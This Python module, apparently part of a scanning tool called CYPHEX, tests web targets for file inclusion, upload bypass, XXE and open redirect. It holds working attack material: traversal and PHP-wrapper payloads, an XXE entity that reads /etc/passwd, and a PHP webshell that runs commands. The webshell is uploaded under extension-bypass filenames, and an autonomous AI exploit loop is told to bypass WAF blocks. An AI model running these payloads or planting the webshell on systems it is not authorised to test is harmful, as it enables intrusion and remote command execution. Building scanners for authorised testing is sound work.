"""
CYPHEX — Agent 07: LFI / File Upload / XXE Agent

Tests for:
  - Local File Inclusion (directory traversal)
  - Path traversal with encoding bypasses
  - File upload bypass (webshell)
  - XXE (XML External Entity) injection
"""

import os
import re
import shlex
from urllib.parse import quote

from agents.base_agent import BaseAgent
from models.scan import ScanContext, Vuln
from models.agent_result import AgentResult


class LFIAgent(BaseAgent):

    LFI_PAYLOADS = [
        ("../../../etc/passwd", "basic_traversal"),
        ("....//....//....//etc/passwd", "double_dot_bypass"),
        ("..\\..\\..\\etc\\passwd", "backslash_traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
        ("..%252f..%252f..%252fetc%252fpasswd", "double_encoded"),
        ("/etc/passwd", "absolute_path"),
        ("....//....//....//windows/win.ini", "windows_traversal"),
        ("..\\..\\..\\windows\\win.ini", "windows_backslash"),
        # PHP wrappers
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "php_filter"),
        ("php://filter/read=string.rot13/resource=/etc/passwd", "php_rot13"),
    ]

    # Parameters likely to be file-inclusion targets
    FILE_PARAM_KEYWORDS = [
        'file', 'path', 'page', 'template', 'include',
        'dir', 'doc', 'document', 'name', 'load',
        'folder', 'style', 'theme', 'lang', 'view',
        'content', 'layout', 'mod', 'conf',
    ]

    @staticmethod
    def _q(value: str) -> str:
        """Shell-quote untrusted values before embedding in terminal commands."""
        return shlex.quote(str(value))

    async def run(self, context: ScanContext) -> AgentResult:
        await self.log("═══ LFI / FILE UPLOAD / XXE TESTING ═══", "info")

        # ─── 1. Find file inclusion parameters ───
        file_params = [
            p for p in context.all_params
            if any(kw in p.name.lower() for kw in self.FILE_PARAM_KEYWORDS)
        ]

        # Also check common LFI endpoints
        for path in ["/api/file", "/file", "/download", "/include", "/load"]:
            for param_name in ["path", "file", "name", "page"]:
                url = f"{context.target_url.rstrip('/')}{path}"
                probe_url = f"{url}?{param_name}=test.txt"
                out = await self.terminal.run(
                    f'curl -s -o /dev/null -w "%{{http_code}}" --max-time 5 '
                    f'{shlex.quote(probe_url)}'
                )
                status = out.stdout.strip().replace("'", "")
                if status not in ["404", "000"]:
                    from models.scan import ParamData
                    file_params.append(ParamData(
                        url=url, name=param_name, value="test.txt"
                    ))

        # ─── 2. Test LFI on file parameters ───
        if file_params:
            await self.log(
                f"Testing {len(file_params)} file parameters for LFI...", "info"
            )
            for param in file_params:
                await self._test_lfi(param, context)
        else:
            await self.log("No file-inclusion parameters found", "info")

        # ─── 3. Test LFI on all forms ───
        await self.log("Testing forms for file inclusion...", "info")
        for form in context.all_forms:
            file_inputs = [
                inp for inp in form.inputs
                if any(kw in inp.lower() for kw in self.FILE_PARAM_KEYWORDS)
            ]
            for inp in file_inputs:
                from models.scan import ParamData
                param = ParamData(url=form.action, name=inp)
                await self._test_lfi(param, context)

        # ─── 4. File upload testing ───
        upload_forms = [f for f in context.all_forms if f.has_file_upload]
        if upload_forms:
            await self.log(
                f"Testing {len(upload_forms)} file upload forms...", "info"
            )
            for form in upload_forms:
                await self._test_file_upload(form, context)

        # ─── 5. XXE testing ───
        await self.log("Testing for XXE...", "info")
        await self._test_xxe(context)

        # ─── 6. Open redirect testing ───
        await self.log("Testing for open redirect...", "info")
        await self._test_open_redirect(context)

        await self.log(
            f"LFI/Upload/XXE testing complete: {len(self.vulns)} vulns found",
            "success" if not self.vulns else "danger",
        )

        return AgentResult(
            agent="LFIAgent",
            vulns=self.vulns,
            context=context,
            terminal_logs=self.terminal.command_history,
        )

    async def _test_lfi(self, param, context: ScanContext):
        """Test a parameter for Local File Inclusion using Autonomous AI Loop."""
        task_desc = (
            f"Test for LFI (Local File Inclusion) on endpoint: {param.url} "
            f"via the parameter '{param.name}'. "
            f"Attempt to read '/etc/passwd' or 'windows/win.ini'. "
            f"Use different encoding, traversal depths, and --path-as-is. "
            f"Check for WAF blocks and bypass them using -A 'CustomUserAgent'."
        )
        await self.autonomous_exploit_loop(context, task_description=task_desc, max_steps=5)

    async def _test_file_upload(self, form, context: ScanContext):
        """Test file upload for bypass vulnerabilities."""
        await self.log(f"Testing file upload on {form.action}...", "info")

        # Test with a PHP webshell disguised as image
        test_content = '<?php echo "CYPHEX_UPLOAD_TEST"; system($_GET["cmd"]); ?>'

        # Write the payload to a real temp file instead of piping it through
        # a `<<< "..."` here-string: the payload contains characters like
        # `"` and `$_GET[...]` that the shell would expand/mangle inside a
        # here-string, corrupting the payload before curl ever sees it.
        payload_path = os.path.join(self.terminal.working_dir, "upload_payload.php")
        with open(payload_path, "w") as f:
            f.write(test_content)

        extensions = [
            ("test.php", "direct_php"),
            ("test.php.jpg", "double_extension"),
            ("test.pHp", "case_bypass"),
            ("test.php%00.jpg", "null_byte"),
            ("test.phtml", "alt_extension"),
        ]

        for filename, bypass_type in extensions:
            # Use curl multipart upload, reading the payload from the temp
            # file on disk (`-F` file field) instead of stdin — this keeps
            # the request behavior (multipart file upload) identical while
            # avoiding any shell quoting/expansion of the payload content.
            upload_field = f"file=@{payload_path};filename={filename}"
            out = await self.terminal.run(
                f'curl -s -X POST {shlex.quote(form.action)} '
                f'-F {shlex.quote(upload_field)} '
                f'--max-time 10'
            )

            if out.stdout and any(kw in out.stdout.lower() for kw in [
                'uploaded', 'success', 'file saved', 'upload complete'
            ]):
                await self.add_vuln(Vuln(
                    name=f"File Upload Bypass — {bypass_type}",
                    severity="Critical",
                    cvss_score=9.8,
                    endpoint=form.action,
                    payload=filename,
                    confirmed=True,
                    evidence=out.stdout[:300],
                    fix="Validate file types server-side. Use allowlist for extensions.",
                ))
                break

    async def _test_xxe(self, context: ScanContext):
        """Test for XML External Entity injection."""
        xxe_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE root ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<root>&xxe;</root>'
        )

        # Test known XML endpoints
        for endpoint in context.xml_endpoints:
            endpoint_q = self._q(endpoint)
            payload_q = self._q(xxe_payload)
            out = await self.terminal.run(
                f'curl -s -X POST {shlex.quote(endpoint)} '
                f'-H "Content-Type: application/xml" '
                f"-d '{xxe_payload}' "
                f'--max-time 10'
            )

            if out.stdout and "root:x:0:0" in out.stdout:
                await self.add_vuln(Vuln(
                    name="XXE — File Read",
                    severity="Critical",
                    cvss_score=9.1,
                    endpoint=endpoint,
                    confirmed=True,
                    evidence=out.stdout[:300],
                    fix="Disable external entity processing in XML parser.",
                ))

        # Also test common API endpoints
        for path in ["/api", "/api/upload", "/api/import", "/api/data"]:
            url = f"{context.target_url.rstrip('/')}{path}"
            url_q = self._q(url)
            payload_q = self._q(xxe_payload)
            out = await self.terminal.run(
                f'curl -s -X POST {shlex.quote(url)} '
                f'-H "Content-Type: application/xml" '
                f"-d '{xxe_payload}' "
                f'--max-time 5'
            )

            if out.stdout and "root:x:0:0" in out.stdout:
                await self.add_vuln(Vuln(
                    name="XXE — File Read",
                    severity="Critical",
                    cvss_score=9.1,
                    endpoint=url,
                    confirmed=True,
                    evidence=out.stdout[:300],
                    fix="Disable DTD processing and external entities.",
                ))

    async def _test_open_redirect(self, context: ScanContext):
        """Test for open redirect vulnerabilities."""
        redirect_params = [
            p for p in context.all_params
            if any(kw in p.name.lower() for kw in [
                'url', 'redirect', 'next', 'return', 'dest',
                'destination', 'redir', 'goto', 'link', 'to'
            ])
        ]

        # Also check common redirect endpoints
        for path in ["/redirect", "/redir", "/goto", "/out"]:
            for param_name in ["url", "to", "next", "redirect"]:
                full_url = f"{context.target_url.rstrip('/')}{path}"
                probe_url = f"{full_url}?{param_name}=test"
                out = await self.terminal.run(
                    f'curl -s -o /dev/null -w "%{{http_code}}" --max-time 5 '
                    f'{shlex.quote(probe_url)}'
                )
                status = out.stdout.strip().replace("'", "")
                if status not in ["404", "000"]:
                    from models.scan import ParamData
                    redirect_params.append(ParamData(
                        url=full_url, name=param_name
                    ))

        evil_url = "https://evil-cyphex-test.com"
        for param in redirect_params:
            url = f"{param.url}?{param.name}={quote(evil_url)}"
            url_q = self._q(url)

            out = await self.terminal.run(
                f'curl -s -I -L --max-redirs 0 --max-time 5 {shlex.quote(url)}'
            )

            if evil_url in out.stdout:
                await self.add_vuln(Vuln(
                    name="Open Redirect",
                    severity="Medium",
                    cvss_score=6.1,
                    endpoint=param.url,
                    payload=f"{param.name}={evil_url}",
                    confirmed=True,
                    description="Redirects to arbitrary external URLs — phishing risk.",
                    fix="Whitelist allowed redirect destinations.",
                ))

            # Also check if the URL appears in body (client-side redirect)
            out2 = await self.terminal.run(
                f'curl -s --max-time 5 {shlex.quote(url)}'
            )
            if evil_url in (out2.stdout or ""):
                await self.add_vuln(Vuln(
                    name="Open Redirect (Client-Side)",
                    severity="Medium",
                    cvss_score=6.1,
                    endpoint=param.url,
                    payload=f"{param.name}={evil_url}",
                    confirmed=True,
                    fix="Validate redirect URLs against a whitelist.",
                ))
